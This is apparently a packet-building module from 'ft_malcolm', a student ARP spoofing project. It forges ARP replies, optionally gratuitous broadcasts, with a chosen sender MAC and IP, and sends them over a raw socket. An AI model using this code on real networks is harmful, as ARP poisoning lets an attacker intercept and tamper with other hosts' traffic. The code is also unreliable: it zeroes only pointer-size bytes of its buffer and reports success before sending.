/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   packet.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ffarkas <ffarkas@student.42prague.com>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/11/01 02:53:13 by ffarkas           #+#    #+#             */
/*   Updated: 2024/11/01 07:56:37 by ffarkas          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incl/ft_malcolm.h"

static void	fill_reply_packet(unsigned char *buffer, t_malcolm *malcolm)
{
	t_packet	*reply;

	reply = (void *)buffer + sizeof(struct ethhdr);
	reply->header.ar_hrd = htons(ARP_HARDWARE_ETH);
	reply->header.ar_pro = htons(ARP_PROTOCOL_IP);
	reply->header.ar_hln = MAC_BINLENGTH;
	reply->header.ar_pln = IPv4_BINLENGTH;
	reply->header.ar_op = htons(ARP_OP_REPLY);
	ft_memcpy(reply->source_mac, malcolm->source.mac_addr, MAC_BINLENGTH);
	ft_memcpy(reply->source_ip, malcolm->source.ip_addr, IPv4_BINLENGTH);
	if (malcolm->options.gratuitous)
	{
		ft_memset(reply->target_mac, 0xFF, MAC_BINLENGTH);
		ft_memcpy(reply->target_ip, malcolm->source.ip_addr, IPv4_BINLENGTH);
	}
	else
	{
		ft_memcpy(reply->target_mac, malcolm->target.mac_addr, MAC_BINLENGTH);
		ft_memcpy(reply->target_ip, malcolm->target.ip_addr, IPv4_BINLENGTH);
	}
	if (malcolm->options.verbose)
	{
		print_arp_info(reply);
		print_packet_info(reply, ARP_OP_REPLY);
	}
}

static void	fill_ethernet_header(unsigned char *buffer, t_malcolm *malcolm)
{
	struct ethhdr	*eth_header;

	eth_header = (struct ethhdr *)buffer;
	ft_memcpy(eth_header->h_dest, malcolm->target.mac_addr, MAC_BINLENGTH);
	ft_memcpy(eth_header->h_source, malcolm->source.mac_addr, MAC_BINLENGTH);
	eth_header->h_proto = htons(ETH_PROTOCOL_ARP);
	if (malcolm->options.verbose)
		print_eth_info(eth_header);
}

static void	prepare_packet(unsigned char *buffer, t_malcolm *malcolm)
{
	configure_sender(&malcolm->spoof.socket_addr, malcolm);
	ft_memset(buffer, 0, sizeof(buffer));
	fill_ethernet_header(buffer, malcolm);
	fill_reply_packet(buffer, malcolm);
}

int	send_arp_reply(t_malcolm *malcolm)
{
	unsigned char	reply_buffer[sizeof(t_packet) + sizeof(struct ethhdr)];
	ssize_t			sent_bytes;

	dprintf(STDOUT_FILENO, "%sft_malcolm:%s preparing ARP reply packet for transmission\n\n", GR, NC);
	prepare_packet(reply_buffer, malcolm);
	dprintf(STDOUT_FILENO, 
		"%sft_malcolm:%s sending an ARP reply packet [%s]\n\n"
		"%s%sPLEASE WAIT...%s\n\n"
		, YL, NC, fetch_time(), PAD, BL, NC);
	usleep(1500000);
	dprintf(STDOUT_FILENO, "%sft_malcolm:%s ARP reply packet sent successfully [%s]\n", YL, NC, fetch_time());
	sent_bytes = sendto(malcolm->spoof.socket_fd, &reply_buffer, sizeof(reply_buffer), 0, \
		(struct sockaddr *)&malcolm->spoof.socket_addr, sizeof(malcolm->spoof.socket_addr));
	if (sent_bytes == -1)
	{
		close(malcolm->spoof.socket_fd);
		return (print_args_error("%sft_malcolm:%s failed to send ARP reply packet\n", RD, NC));
	}
	close(malcolm->spoof.socket_fd);
	return (VALID);
}
